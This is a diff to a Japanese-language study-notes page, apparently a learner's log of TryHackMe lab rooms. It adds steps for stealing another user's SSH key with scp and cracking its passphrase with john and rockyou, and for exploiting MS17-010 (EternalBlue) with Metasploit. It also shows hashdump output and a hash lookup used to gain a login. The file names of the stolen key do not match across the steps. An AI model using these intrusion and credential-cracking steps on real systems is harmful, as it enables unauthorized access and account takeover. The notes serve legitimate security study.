@@ -95,28 +95,33 @@
 <li class="toctree-l3"><a class="reference internal" href="#id4">サイトへの攻撃</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#samba">Sambaへの攻撃</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#ssh">辞書攻撃でsshアクセスする</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id5">参考サイト</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id6">Day2勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id5">横展開</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id6">参考サイト</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id7">Day2勉強したこと</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="#day3">Day3</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id7">Day3勉強したこと</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#day3-windows">Day3：Windowsの脆弱性を利用した攻撃</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id8">ネットワークの偵察</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id9">脆弱性の調査</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id10">脆弱性への攻撃</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id11">レインボーテーブルでハッシュからパスワードを解析</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#day3">Day3勉強したこと</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day4">Day4</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id8">Day4勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id12">Day4勉強したこと</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day5">Day5</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id9">Day5勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id13">Day5勉強したこと</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day6">Day6</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id10">Day6勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id14">Day6勉強したこと</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day7">Day7</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id11">Day7勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id15">Day7勉強したこと</a></li>
 </ul>
 </li>
 </ul>
@@ -329,50 +334,147 @@ rockyouは1500万ものパスワードが保管されている。</p>
 <p><img alt="" src="../_images/7DayHacking_day2_2.png" /></p>
 </section>
 <section id="id5">
-<h3>参考サイト<a class="headerlink" href="#id5" title="この見出しへのパーマリンク">¶</a></h3>
-<ul class="simple">
-<li><p>同じRoomを完了させている人：<a class="reference external" href="https://zenn.dev/ci/articles/aa15d88b06bbed#%E5%8F%82%E8%80%83%E3%81%AB%E3%81%95%E3%81%9B%E3%81%A6%E3%81%84%E3%81%9F%E3%81%A0%E3%81%84%E3%81%9F%E6%83%85%E5%A0%B1%E7%BE%A4">TryHackMeでハッキングを勉強してみた話</a></p></li>
-</ul>
+<h3>横展開<a class="headerlink" href="#id5" title="この見出しへのパーマリンク">¶</a></h3>
+<p>janについては、アカウントを侵害できたので、kayについても侵害したい。これを横展開や水平展開とよぶ。
+または、より権限が強いアカウントに対して攻撃できる場合は権限昇格ということもある。</p>
+<p>ssh先でファイルを見ていると秘密鍵を発見。/home/kay/.ssh/rd_rsa</p>
+<p>以下のSCPコマンドでローカルにrd_rsaをDLしたら、これを解析していく</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">scp</span> <span class="n">jan</span><span class="o">@</span><span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kay</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span> <span class="o">./</span><span class="n">id_rsa</span>
+</pre></div>
+</div>
+<p>SSH秘密鍵が得られたが、パスフレーズで保護されておりそのままではログインできなかった。
+ssh2john を使って鍵を John the Ripper 形式に変換し、rockyou.txt でクラックを実施</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh2john</span> <span class="n">kay_rsa</span> <span class="o">&gt;</span> <span class="n">kay_hash</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">john</span> <span class="n">kay_hash</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
 </section>
 <section id="id6">
-<h3>Day2勉強したこと<a class="headerlink" href="#id6" title="この見出しへのパーマリンク">¶</a></h3>
+<h3>参考サイト<a class="headerlink" href="#id6" title="この見出しへのパーマリンク">¶</a></h3>
+<ul class="simple">
+<li><p>同じRoomを完了させている人：<a class="reference external" href="https://zenn.dev/ci/articles/aa15d88b06bbed#%E5%8F%82%E8%80%83%E3%81%AB%E3%81%95%E3%81%9B%E3%81%A6%E3%81%84%E3%81%9F%E3%81%A0%E3%81%84%E3%81%9F%E6%83%85%E5%A0%B1%E7%BE%A4">TryHackMeでハッキングを勉強してみた話</a></p></li>
+<li><p>同じRoomを完了させている人：<a class="reference external" href="https://qiita.com/kk0128/items/bbbdaa5d5982135f9b5a">【TryHackMe】Basic Pentesting：Walkthrough</a></p></li>
+</ul>
+</section>
+<section id="id7">
+<h3>Day2勉強したこと<a class="headerlink" href="#id7" title="この見出しへのパーマリンク">¶</a></h3>
 <ul class="simple">
 <li><p>nmapで利用しているポートを洗い出せる</p></li>
 <li><p>dirbでサーバーのディレクトリ攻撃ができる</p></li>
 <li><p>SambdaはLinux用の共通フォルダサービス</p></li>
 <li><p>Sambdaにアノニマスユーザーが残っていると攻撃されうる</p></li>
 <li><p>hydraでパスワードのブルーフォース攻撃ができる</p></li>
+<li><p>sshでログインできればscpとかでファイルをローカルに保存できる</p></li>
 </ul>
 </section>
 </section>
+<section id="day3-windows">
+<h2>Day3：Windowsの脆弱性を利用した攻撃<a class="headerlink" href="#day3-windows" title="この見出しへのパーマリンク">¶</a></h2>
+<p>Windowsサーバーに対してまずはnmapで偵察</p>
+<section id="id8">
+<h3>ネットワークの偵察<a class="headerlink" href="#id8" title="この見出しへのパーマリンク">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">v</span> <span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span> <span class="o">--</span><span class="n">script</span> <span class="n">vuln</span>
+</pre></div>
+</div>
+<p>&quot;--script vuln&quot;によって、脆弱性の調査までしてくれる。</p>
+<p>VULNERABLE(脆弱性)の結果として、&quot;CVE-2017-0143&quot;が出力され、リモートからの不正コード実行のRCE(Remote Code Execution)の脆弱性があることを確認できる。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</pre></div>
+</div>
+</section>
+<section id="id9">
+<h3>脆弱性の調査<a class="headerlink" href="#id9" title="この見出しへのパーマリンク">¶</a></h3>
+<p>CVEは&quot;Common Vulnerabilities and Exposures&quot;という脆弱性の識別子である。
+CVE-2017-0143で検索すると、どのような脆弱性かを確認できる。</p>
+<p>CVE-2017-0143はSambdaなどで利用されるSMB(Server Message Block)と呼ばれる、ファイル共有に利用するプロトコルの旧バージョンの脆弱性。
+SMBに対して、特別なコードを実行することで任意のコードをOS上で実行することが可能になる。</p>
+<p>2017年、世界中で猛威をふるったサイバー攻撃の1つが「EternalBlue（エターナルブルー）」を悪用した**WannaCry（ワナクライ）**による感染でした。この攻撃は、Windowsの脆弱性を突いてPCを乗っ取り、ファイルを暗号化して金銭（ビットコイン）を要求するというものでした。</p>
+</section>
+<section id="id10">
+<h3>脆弱性への攻撃<a class="headerlink" href="#id10" title="この見出しへのパーマリンク">¶</a></h3>
+<p>Kali Linuxには、Metasploit Frameworkというツールが準備されており、脆弱性への攻撃をすることができる。</p>
+<p>mfsconsoleを呼び出し、脆弱性を指定して攻撃をすることができる。
+以下の一連の流れに沿ってコマンドを実行すだけで脆弱性に対して攻撃し、RCEが成功する。</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># mfsconsoleの実行</span>
+msfconsole
+<span class="c1"># 脆弱性の調査(利用可能なモジュールが表示される)</span>
+search<span class="w"> </span>CVE-2017-0143
+<span class="c1"># 利用するモジュール指定</span>
+use<span class="w"> </span><span class="m">0</span>
+<span class="c1"># オプション指定</span>
+show<span class="w"> </span>options
+<span class="c1"># オプション指定</span>
+<span class="nb">set</span><span class="w"> </span>XXX
+<span class="c1"># 攻撃</span>
+exploit
+</pre></div>
+</div>
+<p>Windowsにアクセスできたので、Flagを獲得する</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">search</span> <span class="o">-</span><span class="n">f</span> <span class="n">flag</span><span class="o">*</span>
+</pre></div>
+</div>
+</section>
+<section id="id11">
+<h3>レインボーテーブルでハッシュからパスワードを解析<a class="headerlink" href="#id11" title="この見出しへのパーマリンク">¶</a></h3>
+<p>脆弱性から管理者権限まで取得できたが、ユーザーのログイン情報まで取得してみる。</p>
+<p>Windowsのアカウント情報を以下で吐き出す。</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</pre></div>
+</div>
+<p>JonというユーザーとHashされたパスワード(ffb43xxxx)が出力される。</p>
+<p>ハッシュは本来は元のパスワードを調べることはできないが、レインボーテーブルというパスワードとそのパスワードをハッシュ化したテーブルがあれば、ハッシュからパスワードを調査することができる。</p>
+<p>今回は<a class="reference external" href="https://crackstation.net/">Free Password Hash Cracker</a>というサイトを利用してHashからクラックしてみる。</p>
+<p><img alt="" src="../_images/7DayHacking_day3_1.png" /></p>
+<p>最後にWindowsにリモートデスクトップでJonとしてログインしてみる。</p>
+</section>
 <section id="day3">
-<h2>Day3<a class="headerlink" href="#day3" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id7">
-<h3>Day3勉強したこと<a class="headerlink" href="#id7" title="この見出しへのパーマリンク">¶</a></h3>
+<h3>Day3勉強したこと<a class="headerlink" href="#day3" title="この見出しへのパーマリンク">¶</a></h3>
+<ul class="simple">
+<li><p>nmapで脆弱性まで一緒に調査できる</p></li>
+<li><p>CVEで脆弱性はナンバリングされ管理されている</p></li>
+<li><p>MetaSploite Frameworkを利用して簡単に脆弱性をついた攻撃ができる</p></li>
+<li><p>パスワードが簡単なものだと、hashが流出してしまうとhashからパスワードが逆算されてしまう</p></li>
+</ul>
 </section>
 </section>
 <section id="day4">
 <h2>Day4<a class="headerlink" href="#day4" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id8">
-<h3>Day4勉強したこと<a class="headerlink" href="#id8" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id12">
+<h3>Day4勉強したこと<a class="headerlink" href="#id12" title="この見出しへのパーマリンク">¶</a></h3>
 </section>
 </section>
 <section id="day5">
 <h2>Day5<a class="headerlink" href="#day5" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id9">
-<h3>Day5勉強したこと<a class="headerlink" href="#id9" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id13">
+<h3>Day5勉強したこと<a class="headerlink" href="#id13" title="この見出しへのパーマリンク">¶</a></h3>
 </section>
 </section>
 <section id="day6">
 <h2>Day6<a class="headerlink" href="#day6" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id10">
-<h3>Day6勉強したこと<a class="headerlink" href="#id10" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id14">
+<h3>Day6勉強したこと<a class="headerlink" href="#id14" title="この見出しへのパーマリンク">¶</a></h3>
 </section>
 </section>
 <section id="day7">
 <h2>Day7<a class="headerlink" href="#day7" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id11">
-<h3>Day7勉強したこと<a class="headerlink" href="#id11" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id15">
+<h3>Day7勉強したこと<a class="headerlink" href="#id15" title="この見出しへのパーマリンク">¶</a></h3>
 </section>
 </section>
 </section>
